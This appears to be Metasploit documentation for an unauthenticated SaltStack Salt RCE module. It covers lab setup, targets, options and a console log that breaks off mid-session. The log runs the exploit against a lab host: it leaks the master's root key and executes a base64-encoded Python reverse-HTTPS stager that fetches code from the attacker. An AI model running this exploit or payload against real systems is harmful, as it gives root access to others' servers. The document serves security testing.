{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/misc/saltstack_salt_unauth_rce","result":{"data":{"moduleMetadataJson":{"id":"d3e7bdd1-1365-55cb-908a-abe18f87d97d","name":"SaltStack Salt Master/Minion Unauthenticated RCE","fullname":"exploit/linux/misc/saltstack_salt_unauth_rce","description":"This module exploits unauthenticated access to the runner() and\n          _send_pub() methods in the SaltStack Salt master's ZeroMQ request\n          server, for versions 2019.2.3 and earlier and 3000.1 and earlier, to\n          execute code as root on either the master or on select minions.\n\n          VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as\n          well as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual\n          Internet Routing Lab Personal Edition (VIRL-PE), for versions 1.2,\n          1.3, 1.5, and 1.6 in certain configurations, are known to be affected\n          by the Salt vulnerabilities.\n\n          Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as\n          well as Vulhub's Docker image.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/linux/misc/saltstack_salt_unauth_rce","documentationSlug":"/modules/documentation/exploit/linux/misc/saltstack_salt_unauth_rce","referencesSlug":"/modules/references/exploit/linux/misc/saltstack_salt_unauth_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>This module exploits unauthenticated access to the <code class=\"language-text\">runner()</code> and\n<code class=\"language-text\">_send_pub()</code> methods in the SaltStack Salt master's ZeroMQ request\nserver, for versions 2019.2.3 and earlier and 3000.1 and earlier, to\nexecute code as root on either the master or on select minions.</p>\n<p>VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as\nwell as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual\nInternet Routing Lab Personal Edition (VIRL-PE), for versions 1.2,\n1.3, 1.5, and 1.6 in certain configurations, are known to be affected\nby the Salt vulnerabilities.</p>\n<p>Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as\nwell as Vulhub's Docker image.</p>\n<h3 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h3>\n<p><strong>Note:</strong> I did the bulk of my testing after manually installing Salt in\nan <a href=\"#using-a-virtual-machine\">Ubuntu 18.04 VM</a>, but the <a href=\"#using-docker\">Docker image\nfrom Vulhub</a> may be quicker. YMMV.</p>\n<h4 id=\"using-a-virtual-machine\" style=\"position:relative;\"><a href=\"#using-a-virtual-machine\" aria-label=\"using a virtual machine permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using a virtual machine</h4>\n<ol>\n<li>Set up an Ubuntu 18.04 VM</li>\n<li>Browse to <a href=\"https://repo.saltstack.com/#ubuntu\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SaltStack's instructions for\nUbuntu</a></li>\n<li>Select <code class=\"language-text\">Pin to Minor Release</code> and change all versions to either\n<strong>2019.2.3</strong> or <strong>3000.1</strong>, depending on the version you wish to test</li>\n<li>Follow the instructions, installing only the <code class=\"language-text\">salt-master</code> and\n<code class=\"language-text\">salt-minion</code> packages necessary for testing</li>\n<li>Follow the <a href=\"https://docs.saltstack.com/en/latest/ref/configuration/index.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">post-installation\nconfiguration</a></li>\n</ol>\n<p>You may now begin testing.</p>\n<h4 id=\"using-docker\" style=\"position:relative;\"><a href=\"#using-docker\" aria-label=\"using docker permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using Docker</h4>\n<p><strong>Prerequisites:</strong> <a href=\"https://docs.docker.com/get-docker/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Docker</a> and\n<a href=\"https://docs.docker.com/compose/install/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Docker Compose</a> must be\ninstalled first.</p>\n<p><strong>Note:</strong> The Salt master is already configured and running in the\nfollowing scenario. The majority of the steps below are for configuring\nand starting the minion. Version <strong>2019.2.3</strong> will be used.</p>\n<ol>\n<li>Run <code class=\"language-text\">git clone https://github.com/vulhub/vulhub</code></li>\n<li>Run <code class=\"language-text\">cd vulhub/saltstack/CVE-2020-11651</code></li>\n<li>Run <code class=\"language-text\">docker-compose up -d</code> to start the container in the background</li>\n<li>Run <code class=\"language-text\">docker exec -it cve-2020-11651_saltstack_1 bash</code> to drop to a\nroot shell inside the container</li>\n<li>Run <code class=\"language-text\">echo $&#39;127.0.0.1\\tsalt&#39; &gt;&gt; /etc/hosts</code> to add the master to\n<code class=\"language-text\">/etc/hosts</code> (this allows the minion to find the master)</li>\n<li>Run <code class=\"language-text\">salt-minion -d</code> to execute the minion in the background</li>\n<li>Run <code class=\"language-text\">salt-key -A</code> and accept the key for the minion</li>\n</ol>\n<p>You may now begin testing.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>Follow <a href=\"#setup\">Setup</a> and <a href=\"#scenarios\">Scenarios</a>.</p>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<h3 id=\"master-python-payload\" style=\"position:relative;\"><a href=\"#master-python-payload\" aria-label=\"master python payload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Master (Python payload)</h3>\n<p>This executes a Python payload on the master(s) specified by <code class=\"language-text\">RHOST(S)</code>.</p>\n<h3 id=\"master-unix-command\" style=\"position:relative;\"><a href=\"#master-unix-command\" aria-label=\"master unix command permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Master (Unix command)</h3>\n<p>This executes a Unix command payload on the master(s) specified by\n<code class=\"language-text\">RHOST(S)</code>.</p>\n<h3 id=\"minions-python-payload\" style=\"position:relative;\"><a href=\"#minions-python-payload\" aria-label=\"minions python payload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Minions (Python payload)</h3>\n<p>This executes a Python payload on the minions specified by the <code class=\"language-text\">MINIONS</code>\noption.</p>\n<h3 id=\"minions-unix-command\" style=\"position:relative;\"><a href=\"#minions-unix-command\" aria-label=\"minions unix command permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Minions (Unix command)</h3>\n<p>This executes a Unix command payload on the minions specified by the\n<code class=\"language-text\">MINIONS</code> option.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"root_key\" style=\"position:relative;\"><a href=\"#root_key\" aria-label=\"root_key permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROOT_KEY</h3>\n<p>If you already have the master's root key, you may set it in this\noption. Note that the master regenerates the root key on each startup.</p>\n<h3 id=\"minions\" style=\"position:relative;\"><a href=\"#minions\" aria-label=\"minions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MINIONS</h3>\n<p>This is the PCRE regex of minions to execute the payload on. Defaults to\n<code class=\"language-text\">.*</code> for all minions.</p>\n<h3 id=\"wfsdelay\" style=\"position:relative;\"><a href=\"#wfsdelay\" aria-label=\"wfsdelay permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>WfsDelay</h3>\n<p>Set this to the number of seconds to wait for <strong>all</strong> sessions to come\nin. Defaults to <strong>10 seconds</strong>, though the exploit may wait up to 20\nseconds.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"saltstack-salt-201923-on-ubuntu-1804\" style=\"position:relative;\"><a href=\"#saltstack-salt-201923-on-ubuntu-1804\" aria-label=\"saltstack salt 201923 on ubuntu 1804 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SaltStack Salt 2019.2.3 on Ubuntu 18.04</h3>\n<h4 id=\"executing-python-payload-on-the-master\" style=\"position:relative;\"><a href=\"#executing-python-payload-on-the-master\" aria-label=\"executing python payload on the master permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Executing Python payload on the master</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/misc/saltstack_salt_unauth_rce\nmsf5 exploit(linux/misc/saltstack_salt_unauth_rce) &gt; show targets\n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Master (Python payload)\n   1   Master (Unix command)\n   2   Minions (Python payload)\n   3   Minions (Unix command)\n\n\nmsf5 exploit(linux/misc/saltstack_salt_unauth_rce) &gt; options\n\nModule options (exploit/linux/misc/saltstack_salt_unauth_rce):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   MINIONS   .*               yes       PCRE regex of minions to target\n   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;\n   ROOT_KEY                   no        Master&#39;s root key if you have it\n   RPORT     4506             yes       The target port (TCP)\n   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT   8080             yes       The local port to listen on.\n   SSL       false            no        Negotiate SSL for incoming connections\n   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)\n   URIPATH                    no        The URI to use for this exploit (default is random)\n\n\nPayload options (python/meterpreter/reverse_https):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The local listener hostname\n   LPORT  8443             yes       The local listener port\n   LURI                    no        The HTTP Path\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Master (Python payload)\n\n\nmsf5 exploit(linux/misc/saltstack_salt_unauth_rce) &gt; set rhosts 172.28.128.5\nrhosts =&gt; 172.28.128.5\nmsf5 exploit(linux/misc/saltstack_salt_unauth_rce) &gt; set lhost 172.28.128.1\nlhost =&gt; 172.28.128.1\nmsf5 exploit(linux/misc/saltstack_salt_unauth_rce) &gt; run\n\n[*] Started HTTPS reverse handler on https://172.28.128.1:8443\n[*] 172.28.128.5:4506 - Using auxiliary/gather/saltstack_salt_root_key as check\n[*] 172.28.128.5:4506 - Connecting to ZeroMQ service at 172.28.128.5:4506\n[*] 172.28.128.5:4506 - Negotiating signature\n[+] 172.28.128.5:4506 - Received valid signature: &quot;\\xFF\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x7F&quot;\n[*] 172.28.128.5:4506 - Sending identical signature\n[*] 172.28.128.5:4506 - Negotiating version\n[+] 172.28.128.5:4506 - Received compatible version: &quot;\\x03&quot;\n[*] 172.28.128.5:4506 - Sending identical version\n[*] 172.28.128.5:4506 - Negotiating NULL security mechanism\n[+] 172.28.128.5:4506 - Received NULL security mechanism\n[*] 172.28.128.5:4506 - Sending NULL security mechanism\n[*] 172.28.128.5:4506 - Sending READY command of type REQ\n[+] 172.28.128.5:4506 - Received READY reply of type ROUTER\n[*] 172.28.128.5:4506 - Yeeting _prep_auth_info() at 172.28.128.5:4506\n[+] 172.28.128.5:4506 - Received serialized auth info\n[+] 172.28.128.5:4506 - Root key: bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=\n[*] 172.28.128.5:4506 - Disconnecting from 172.28.128.5:4506\n[*] 172.28.128.5:4506 - Connecting to ZeroMQ service at 172.28.128.5:4506\n[*] 172.28.128.5:4506 - Negotiating signature\n[+] 172.28.128.5:4506 - Received valid signature: &quot;\\xFF\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x7F&quot;\n[*] 172.28.128.5:4506 - Sending identical signature\n[*] 172.28.128.5:4506 - Negotiating version\n[+] 172.28.128.5:4506 - Received compatible version: &quot;\\x03&quot;\n[*] 172.28.128.5:4506 - Sending identical version\n[*] 172.28.128.5:4506 - Negotiating NULL security mechanism\n[+] 172.28.128.5:4506 - Received NULL security mechanism\n[*] 172.28.128.5:4506 - Sending NULL security mechanism\n[*] 172.28.128.5:4506 - Sending READY command of type REQ\n[+] 172.28.128.5:4506 - Received READY reply of type ROUTER\n[*] 172.28.128.5:4506 - Executing Python payload on the master: python/meterpreter/reverse_https\n[*] 172.28.128.5:4506 - Yeeting runner() at 172.28.128.5:4506\n[*] 172.28.128.5:4506 - Executing Python code: exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnSFRUUFNIYW5kbGVyJ10pCmhzPVtdCmlmICh2aVswXT09MiBhbmQgdmk+PSgyLDcsOSkpIG9yIHZpPj0oMyw0LDMpOgoJaW1wb3J0IHNzbAoJc2M9c3NsLlNTTENvbnRleHQoc3NsLlBST1RPQ09MX1NTTHYyMykKCXNjLmNoZWNrX2hvc3RuYW1lPUZhbHNlCglzYy52ZXJpZnlfbW9kZT1zc2wuQ0VSVF9OT05FCglocy5hcHBlbmQodWwuSFRUUFNIYW5kbGVyKDAsc2MpKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cHM6Ly8xNzIuMjguMTI4LjE6ODQ0My96a0p4ZWdUdlhWeUtGcDhDMUtGZmpnTFNKOXNvcycpLnJlYWQoKSkK&#39;)[0]))\n[*] 172.28.128.5:4506 - Unserialized clear load: {&quot;cmd&quot;=&gt;&quot;runner&quot;, &quot;fun&quot;=&gt;&quot;salt.cmd&quot;, &quot;kwarg&quot;=&gt;{&quot;hide_output&quot;=&gt;true, &quot;ignore_retcode&quot;=&gt;true, &quot;output_loglevel&quot;=&gt;&quot;quiet&quot;, &quot;fun&quot;=&gt;&quot;cmd.exec_code&quot;, &quot;lang&quot;=&gt;&quot;python&quot;, &quot;code&quot;=&gt;&quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnSFRUUFNIYW5kbGVyJ10pCmhzPVtdCmlmICh2aVswXT09MiBhbmQgdmk+PSgyLDcsOSkpIG9yIHZpPj0oMyw0LDMpOgoJaW1wb3J0IHNzbAoJc2M9c3NsLlNTTENvbnRleHQoc3NsLlBST1RPQ09MX1NTTHYyMykKCXNjLmNoZWNrX2hvc3RuYW1lPUZhbHNlCglzYy52ZXJpZnlfbW9kZT1zc2wuQ0VSVF9OT05FCglocy5hcHBlbmQodWwuSFRUUFNIYW5kbGVyKDAsc2MpKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cHM6Ly8xNzIuMjguMTI4LjE6ODQ0My96a0p4ZWdUdlhWeUtGcDhDMUtGZmpnTFNKOXNvcycpLnJlYWQoKSkK&#39;)[0]))&quot;}, &quot;user&quot;=&gt;&quot;root&quot;, &quot;key&quot;=&gt;&quot;bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=&quot;}\n[+] 172.28.128.5:4506 - Received runner() response: &quot;\\x01\\x00\\x00&lt;\\x82\\xA3jid\\xB420200510102113141303\\xA3tag\\xBDsalt/run/20200510102113141303&quot;\n[*] https://172.28.128.1:8443 handling request from 172.28.128.5; (UUID: 